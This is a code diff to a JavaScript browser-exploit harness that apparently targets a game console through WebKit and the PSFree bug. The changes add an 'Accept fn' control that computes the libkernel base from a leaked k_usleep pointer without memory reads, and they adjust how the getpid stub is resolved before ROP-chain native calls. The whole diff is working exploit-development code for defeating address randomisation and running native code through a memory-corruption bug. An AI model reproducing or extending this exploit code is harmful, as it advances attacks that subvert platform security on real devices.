@@ -87,7 +87,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830be";
+const BUILD_ID = "rw-20250830bf";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
@@ -261,7 +261,7 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn, nativeModeSel;
-let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnOneReadLk, btnGuessLk, btnTryBillZaiLk;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnAcceptFn, btnOneReadLk, btnGuessLk, btnTryBillZaiLk;
 let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot, btnScanPivotFull;
 let gadgetBtns = [];
@@ -389,6 +389,10 @@ function setUi() {
     if (btnForceLk) {
         btnForceLk.disabled = busy;
         btnForceLk.textContent = "Accept lk";
+    }
+    if (btnAcceptFn) {
+        btnAcceptFn.disabled = busy;
+        btnAcceptFn.textContent = "Accept fn";
     }
     if (btnTryBillZaiLk) btnTryBillZaiLk.disabled = busy || !ready;
     if (btnGuessLk) {
@@ -836,13 +840,15 @@ function ensureNativePrepForFire(p, off, nm) {
     mark("NATIVE-PREP", "fresh slab wb=" + nativePrep.webkitBase + " mode=" + nm);
 }
 
-/** Verified getpid stub — fn+delta when lk is page-aligned off from exports. */
+/** Verified getpid stub — fn-only scan when fn in box (no lk+off reads → OOM). */
 function resolveGetpidStubOff(p, lk, off) {
+    const fn = fnFromUi();
     return resolveGetpidStub(p, lk, off, {
-        fnPtr: fnFromUi(),
+        fnPtr: fn,
         fnRadius: 0x20000,
         fnProbes: 1024,
-        maxProbes: 512,
+        skipLkOffs: !!fn,
+        maxProbes: fn ? 0 : 512,
     });
 }
 
@@ -1044,6 +1050,7 @@ const MANUAL_TESTS = [
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
     { id: "try-cal-ptrs", group: "base", label: "Scan ext→lk" },
     { id: "verify-lk", group: "base", label: "Accept lk (0 read)" },
+    { id: "accept-fn", group: "base", label: "Accept fn (0 read)" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "try-billzai-lk", group: "base", label: "Try BillZai lk" },
     { id: "force-lk", group: "base", label: "Force lk" },
@@ -1068,11 +1075,15 @@ const MANUAL_TESTS = [
 ];
 
 function runManualTest(testId) {
-    const preStartOk = testId === "verify-lk" || testId === "force-lk" || testId === "paste-lk"
+    const preStartOk = testId === "verify-lk" || testId === "accept-fn" || testId === "force-lk" || testId === "paste-lk"
         || testId === "try-cal-ptrs";
     if (preStartOk) {
         if (testId === "verify-lk") {
             runVerifyLk();
+            return;
+        }
+        if (testId === "accept-fn") {
+            acceptFnFromHex(null);
             return;
         }
         if (testId === "try-cal-ptrs") {
@@ -1085,7 +1096,7 @@ function runManualTest(testId) {
         }
     }
     if (!ready || !window.p) return;
-    if (busy && testId !== "verify-lk" && testId !== "force-lk" && testId !== "paste-lk"
+    if (busy && testId !== "verify-lk" && testId !== "accept-fn" && testId !== "force-lk" && testId !== "paste-lk"
         && testId !== "try-billzai-lk") {
         mark("SKIP", "busy — Stop find or wait");
         renderOut();
@@ -3128,13 +3139,53 @@ function runOneReadLk() {
     renderOut();
 }
 
+function acceptFnFromHex(hexOverride) {
+    const off = lkCalcOff();
+    let hex = hexOverride != null ? String(hexOverride).trim().replace(/^0x/i, "") : "";
+    if (!hex && addrIn && addrIn.value)
+        hex = addrIn.value.trim().replace(/^0x/i, "");
+    if (!hex) {
+        mark("LK-FN-SKIP", "paste k_usleep fn ptr from 2e / LK-EXT-CAND");
+        state("paste fn ptr", "bad");
+        renderOut();
+        return false;
+    }
+    const ptr = parseAddr(hex);
+    if (!ptr) {
+        mark("LK-FN-SKIP", "bad hex");
+        state("bad hex", "bad");
+        renderOut();
+        return false;
+    }
+    const hits = calcLkFromFnPtrZeroRead(ptr, off);
+    if (!hits.length) {
+        mark("LK-FN-MISS", hex + " — not a known libkernel fn (want k_usleep from cal 2e)");
+        mark("LK-HINT", "use Accept fn for fn ptr — Accept lk is 16KB base only");
+        state("fn accept failed", "bad");
+        renderOut();
+        return false;
+    }
+    const h = hits[0];
+    saveLastFnPtr(ptr);
+    saveLibkernelSession(h.lk, null, { forced: true });
+    if (addrIn) addrIn.value = hex;
+    mark("LK-FN-OK", "fn=" + hex + " → lk=" + h.lk + " (" + h.via + ") 0 reads — stub @ N0 fire");
+    state("fn accepted (0 reads)", "ok");
+    renderOut();
+    try {
+        crashLog.append("ACCEPT-FN " + hex + " lk=" + h.lk, "LK-FN-OK");
+        crashLog.flushSync();
+    } catch (_) { }
+    return true;
+}
+
 function acceptLkFromHex(hexOverride) {
     const off = lkCalcOff();
     let hex = hexOverride != null ? String(hexOverride).trim().replace(/^0x/i, "") : "";
     if (!hex && addrIn && addrIn.value)
         hex = addrIn.value.trim().replace(/^0x/i, "");
     if (!hex) {
-        mark("LK-SKIP", "paste libkernel base (16KB) or fn ptr — or Scan ext→lk after Start");
+        mark("LK-SKIP", "paste 16KB lk base (…000) — fn ptr uses Accept fn");
         state("paste lk base in hex box", "bad");
         renderOut();
         return false;
@@ -3147,33 +3198,11 @@ function acceptLkFromHex(hexOverride) {
         return false;
     }
 
-    const rvaHits = calcLkFromFnPtrZeroRead(ptr, off);
-    if (rvaHits.length) {
-        const h = rvaHits[0];
-        saveLastFnPtr(ptr);
-        saveLibkernelSession(h.lk, null, { forced: true });
-        if (addrIn) addrIn.value = hex;
-        let stubNote = "";
-        if (window.p) {
-            const stub = resolveGetpidStub(window.p, h.lk, off, {
-                fnPtr: ptr, fnRadius: 0x20000, fnProbes: 512, maxProbes: 256,
-            });
-            if (stub.verified)
-                stubNote = " stub=" + stub.tag;
-            else
-                stubNote = " stub=MISS peek=" + (stub.peek != null ? stub.peek : "?")
-                    + " (Start→Accept again or N0 will fn-scan)";
-        } else {
-            stubNote = " stub=pending (Start→Accept again)";
-        }
-        mark("LK-OK", "fn=" + hex + " → lk=" + h.lk + " (" + h.via + ")" + stubNote);
-        state("fn accepted — lk in session", "ok");
+    if (calcLkFromFnPtrZeroRead(ptr, off).length) {
+        mark("LK-SKIP", hex + " looks like fn ptr — use Accept fn (0 reads, no lk peek)");
+        state("use Accept fn button", "warn");
         renderOut();
-        try {
-            crashLog.append("ACCEPT OK fn=" + hex + " lk=" + h.lk + stubNote, "LK-VERIFY");
-            crashLog.flushSync();
-        } catch (_) { }
-        return true;
+        return false;
     }
 
     const asBase = verifyLibkernelZeroRead(ptr, off, { via: "manual-base" });
@@ -3181,7 +3210,7 @@ function acceptLkFromHex(hexOverride) {
         saveLastFnPtr(null);
         saveLibkernelSession(ptr, null, { forced: true });
         if (addrIn) addrIn.value = String(ptr);
-        mark("LK-OK", String(ptr) + " lk base accepted (0 reads) — Fire getpid when ready");
+        mark("LK-OK", String(ptr) + " lk base accepted (0 reads)");
         state("lk accepted", "ok");
         renderOut();
         try {
@@ -3192,7 +3221,7 @@ function acceptLkFromHex(hexOverride) {
     }
 
     mark("LK-VERIFY-MISS", hex + " — " + (asBase.error || "?"));
-    mark("LK-HINT", "lk must be 16KB-aligned (…000) — from cal LK-PTR or Scan ext→lk");
+    mark("LK-HINT", "lk must be 16KB …000 — or paste k_usleep fn → Accept fn");
     state("accept failed", "bad");
     renderOut();
     try { crashLog.append("ACCEPT FAIL " + hex, "LK-VERIFY"); crashLog.flushSync(); } catch (_) { }
@@ -4509,7 +4538,7 @@ function bisectFireGetpidHook(p, off, hookMode, tag) {
     if (!lk) throw new Error("paste lk in hex box → Accept lk");
     const stub = resolveGetpidStubOff(p, lk, off);
     if (!stub.verified)
-        throw new Error("getpid stub not found — paste usleep fn ptr → Accept lk, or run stub scan");
+        throw new Error("getpid stub not found — Accept fn (k_usleep) then N0");
     if (hookMode === "bf" || hookMode === "bf30" || hookMode === "dual")
         ensurePivotButterfly(p, nativePrep, window._wkCarrier || null);
     bisectPreFireLog(p, nativePrep, lk, stub, tag, hookMode);
@@ -5330,6 +5359,7 @@ function init() {
     btnNative = $("btn-native");
     btnLoadCal = $("btn-load-cal");
     btnForceLk = $("btn-force-lk");
+    btnAcceptFn = $("btn-accept-fn");
     btnOneReadLk = $("btn-one-read-lk");
     btnTryBillZaiLk = $("btn-try-billzai-lk");
     btnGuessLk = $("btn-guess-lk");
@@ -5361,6 +5391,7 @@ function init() {
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
     wireClick(btnOneReadLk, runOneReadLk);
     wireClick(btnForceLk, function () { acceptLkFromHex(null); });
+    wireClick(btnAcceptFn, function () { acceptFnFromHex(null); });
     wireClick(btnTryBillZaiLk, function () { runManualTest("try-billzai-lk"); });
     wireClick(btnGuessLk, function () { runGuessLk(); });
     wireClick(btnPsfreeLite, function () { return runFindLkAuto(FIND_LK_LITE); });
@@ -5432,7 +5463,7 @@ function init() {
             if (savedFn && addrIn && !addrIn.value)
                 addrIn.value = savedFn.replace(/^0x/i, "");
         } catch (_) { }
-        mark("LK-HINT", "paste usleep fn ptr (83b451ce0) or 16KB lk base → Accept lk → Start");
+        mark("LK-HINT", "paste k_usleep fn → Accept fn — or 16KB lk → Accept lk → Start");
     }
 
     if (params.get("clearlog") === "1") clearPersistedLog();
